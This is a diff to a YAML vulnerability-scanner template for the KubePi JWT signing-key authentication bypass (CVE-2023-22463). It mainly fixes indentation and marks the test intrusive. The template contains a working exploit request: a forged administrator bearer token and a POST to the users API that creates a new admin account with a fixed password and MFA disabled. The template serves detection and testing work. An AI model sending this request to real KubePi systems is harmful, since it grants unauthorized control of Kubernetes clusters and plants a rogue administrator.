@@ -2,7 +2,7 @@ id: KUBEPI_JWTSIGKEY_AUTH_BYPASS
 info:
   name: "KubePi JwtSigKey Admin Authentication Bypass"
   description: "This vulnerability allows attackers to bypass authentication mechanisms in KubePi, a Kubernetes management tool. By exploiting a flaw in the JWT signature key validation process, attackers can forge tokens and gain unauthorized administrative access. This vulnerability exposes the system to potential full control, allowing malicious actions on managed Kubernetes clusters."
-  details:  "This vulnerability occurs due to improper validation of JWT (JSON Web Token) signature keys. Attackers can exploit this by crafting a malicious JWT with a manipulated signature, tricking the system into granting admin-level access without proper authentication. This bypass allows unauthorized users to perform administrative tasks on the KubePi interface, impacting the security of Kubernetes clusters managed by the platform."
+  details: "This vulnerability occurs due to improper validation of JWT (JSON Web Token) signature keys. Attackers can exploit this by crafting a malicious JWT with a manipulated signature, tricking the system into granting admin-level access without proper authentication. This bypass allows unauthorized users to perform administrative tasks on the KubePi interface, impacting the security of Kubernetes clusters managed by the platform."
   impact: "The impact of this vulnerability is significant. An attacker can gain unauthorized administrative access to the KubePi dashboard, allowing them to manage Kubernetes clusters without proper authentication. This could lead to malicious actions such as modifying configurations, deleting resources, deploying unauthorized applications, or gaining further access to sensitive systems, compromising the overall security of the environment."
   category:
     name: NO_AUTH
@@ -18,6 +18,8 @@ info:
     - CWE-287
   cve:
     - CVE-2023-22463
+settings:
+  nature: INTRUSIVE
 auth:
   authenticated: true
 api_selection_filters:
@@ -35,12 +37,11 @@ execute:
   type: single
   requests:
     - req:
-      - modify_method: POST
-      - modify_header:
-          authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8"
-      - modify_url: "/kubepi/api/v1/users"
-      - replace_body: '{"authenticate": {"password": "Default1!"},"email": "dummy1@dummy.com","isAdmin": true,"mfa": {"enable": false},"name": "dummyUser}","nickName": "dummyTester","roles": []}'
-      
+        - modify_method: POST
+        - modify_header:
+            authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8"
+        - modify_url: "/kubepi/api/v1/users"
+        - replace_body: '{"authenticate": {"password": "Default1!"},"email": "dummy1@dummy.com","isAdmin": true,"mfa": {"enable": false},"name": "dummyUser}","nickName": "dummyTester","roles": []}'
 validate:
   response_code:
     eq: 200
